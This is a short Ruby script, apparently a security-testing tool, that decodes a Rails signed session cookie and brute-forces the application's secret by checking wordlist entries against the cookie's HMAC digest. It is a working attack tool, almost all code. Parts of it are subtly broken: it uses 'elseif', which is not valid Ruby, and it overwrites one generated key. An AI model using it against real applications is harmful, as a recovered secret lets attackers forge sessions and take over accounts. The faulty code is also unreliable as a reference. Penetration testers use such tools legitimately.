# based on: 
# BustRailsCookie.rb by Corey Benninger

require 'cgi'
require 'base64' 
require 'openssl'
require 'active_record'
require 'optparse'

banner = "Usage: #{$0} [-h HASHTYPE] [-w WORDLIST_FILE] <cookie value--hash>"

##########################
### Set Default Values ###
##########################
hashtype = 'SHA1'
wordlist = ''

opts = OptionParser.new do |opts|
  opts.banner = banner
  opts.on("-h", "--hash HASH") do |h|
    hashtype = h
  end
  opts.on("-w", "--wordlist [FILE]") do |w|
    wordlist = w
  end  
end

begin
 opts.parse!(ARGV) 
rescue Exception => e
  puts e, "", opts
  exit
end 

cookie = ARGV.shift
if cookie == nil || cookie.length < 2
	print banner
	exit
end

####################################
### Print out the Session info   ###
####################################

data, digest = CGI.unescape(cookie).split('--')
puts "\n***Dumping session value***"
puts Base64.decode64(data)


####################################
### Check Hash and set Hash Type ###
####################################

if digest == nil
	print "\nNo hash found. Cookie should be 'CookieValue--HashValue'\n"
	exit
end

if digest.length != 40 && hashtype == 'SHA1'

	if digest.length == 64
		print "\nUsing SHA256\n"
		hashtype = 'SHA256'
	elseif digest.length == 128
		print "\nUsing SHA512\n"
		hashtype = 'SHA512'		
	elseif digest.length == 32
		print "\nUsing MD5\n"
		hashtype = 'MD5'		
	else
		print "\nWARNING: Default hash should be 40 characters long. This cookie hash is: #{digest.length}\nCracking will most likely fail. Try setting the proper hash type.\n"
	end
end

data = CGI.unescape(data)
if wordlist != ''
	puts "\n\n***Beginning Word List Attack***\n"
	File.open(wordlist, "r").each_line do |line|
		keygen = ActiveSupport::KeyGenerator.new(line.chomp, iterations: 1000)
		key = keygen.generate_key('signed encrypted cookie')
		key = keygen.generate_key('signed cookie')
        	dig  = OpenSSL::HMAC.hexdigest(hashtype, key, data)
        	if digest == dig 
			puts "\n\n***PASSWORD FOUND***\nPassword is: #{line}"
			exit
		end
	end
	puts "\nSorry. Password not found in wordlist.\n"
end
